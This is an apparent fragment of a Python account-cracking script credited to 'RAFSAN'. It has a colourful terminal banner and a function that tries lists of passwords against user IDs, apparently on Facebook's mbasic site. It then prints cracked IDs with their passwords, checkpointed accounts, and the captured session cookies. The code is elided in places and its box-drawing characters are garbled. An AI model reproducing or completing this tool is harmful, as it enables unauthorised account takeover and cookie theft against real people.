...
â”ƒ   \033[1;32mFACEBOK      : \033[1;32m RAFSAN
â”ƒ   \033[1;32mGITHUB       :  \033[1;32mRAFSAN.CYBER.403
â”ƒ   \033[1;32mTOOL STATUS  :  \033[1;32mTOOL IS FREE
â”ƒ   \033[1;32mTEAM         :  \033[1;32mPRIVATE 
â”ƒ   \033[1;32mTOOL VIRSION :  \033[1;32m1.3                     â”ƒ
â”ƒ   \033[1;32mTOOL WORK    :  \033[1;32mONLY DATA               â”ƒ
â””â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â” \033[1;97mRAFSAN\33[0;m \033[1;32mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”˜\n""")
...
def mbasic(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s   [RAFSAN] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
            	...
            	cid = coki[65:80]
            	print('\033[1;92m[\033[1;92mRAFSANN-OK[â¤ï¸]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(RAFSANN-Cp [ðŸ’”] ' +cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
        ...
        sys.stdout.write('\r%s   [RAFSAN] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
